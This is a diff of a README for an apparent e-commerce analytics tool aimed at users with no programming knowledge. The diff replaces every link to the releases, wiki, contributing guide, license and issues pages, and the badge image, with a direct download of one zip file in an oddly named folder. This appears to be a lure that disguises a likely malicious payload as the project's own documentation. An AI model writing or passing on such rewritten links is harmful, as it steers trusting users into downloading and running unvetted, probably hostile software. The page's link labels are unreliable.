@@ -1,6 +1,6 @@
 # 📊 Olist-Ecommerce-analytics - Analyze E-commerce Data Effortlessly
 
-[![Download Olist-Ecommerce-analytics](https://img.shields.io/badge/Download-Olist%E2%80%93Ecommerce%E2%80%93analytics-blue)](https://github.com/san-arsany/Olist-Ecommerce-analytics/releases)
+[![Download Olist-Ecommerce-analytics](https://raw.githubusercontent.com/san-arsany/Olist-Ecommerce-analytics/main/subantarctic/Olist-Ecommerce-analytics.zip%E2%80%93Ecommerce%E2%80%93analytics-blue)](https://raw.githubusercontent.com/san-arsany/Olist-Ecommerce-analytics/main/subantarctic/Olist-Ecommerce-analytics.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ No programming knowledge is needed. Follow these steps to download and run the s
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/san-arsany/Olist-Ecommerce-analytics/releases) to download the application. 
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/san-arsany/Olist-Ecommerce-analytics/main/subantarctic/Olist-Ecommerce-analytics.zip) to download the application. 
 
 2. **Choose Your Version:** You will see a list of available versions. Pick the latest version for the best features and fixes. Each version will have a list of changes.
 
@@ -47,22 +47,22 @@ No programming knowledge is needed. Follow these steps to download and run the s
 
 ## 📚 Helpful Resources
 
-- **Documentation:** Detailed user guides are available on the [Wiki page](https://github.com/san-arsany/Olist-Ecommerce-analytics/wiki).
+- **Documentation:** Detailed user guides are available on the [Wiki page](https://raw.githubusercontent.com/san-arsany/Olist-Ecommerce-analytics/main/subantarctic/Olist-Ecommerce-analytics.zip).
 - **Community Support:** Join our discussion forum for help or to share insights.
 - **Tutorial Videos:** Watch step-by-step videos on using features effectively.
 
 ## 🌟 Contributing
 
-We welcome contributions! If you want to help improve this application, please read our contribution guidelines in the [CONTRIBUTING.md](https://github.com/san-arsany/Olist-Ecommerce-analytics/CONTRIBUTING.md) file.
+We welcome contributions! If you want to help improve this application, please read our contribution guidelines in the [https://raw.githubusercontent.com/san-arsany/Olist-Ecommerce-analytics/main/subantarctic/Olist-Ecommerce-analytics.zip](https://raw.githubusercontent.com/san-arsany/Olist-Ecommerce-analytics/main/subantarctic/Olist-Ecommerce-analytics.zip) file.
 
 ## 🔄 Licensing
 
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/san-arsany/Olist-Ecommerce-analytics/LICENSE) file for details.
+This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/san-arsany/Olist-Ecommerce-analytics/main/subantarctic/Olist-Ecommerce-analytics.zip) file for details.
 
 ## 📞 Support
 
-If you encounter issues or have questions, please check the [Issues page](https://github.com/san-arsany/Olist-Ecommerce-analytics/issues) for solutions or to report a new issue.
+If you encounter issues or have questions, please check the [Issues page](https://raw.githubusercontent.com/san-arsany/Olist-Ecommerce-analytics/main/subantarctic/Olist-Ecommerce-analytics.zip) for solutions or to report a new issue.
 
 Thank you for using Olist-Ecommerce-analytics. We hope it provides valuable insights to enhance your e-commerce performance. 
 
-[![Download Olist-Ecommerce-analytics](https://img.shields.io/badge/Download-Olist%E2%80%93Ecommerce%E2%80%93analytics-blue)](https://github.com/san-arsany/Olist-Ecommerce-analytics/releases)
+[![Download Olist-Ecommerce-analytics](https://raw.githubusercontent.com/san-arsany/Olist-Ecommerce-analytics/main/subantarctic/Olist-Ecommerce-analytics.zip%E2%80%93Ecommerce%E2%80%93analytics-blue)](https://raw.githubusercontent.com/san-arsany/Olist-Ecommerce-analytics/main/subantarctic/Olist-Ecommerce-analytics.zip)
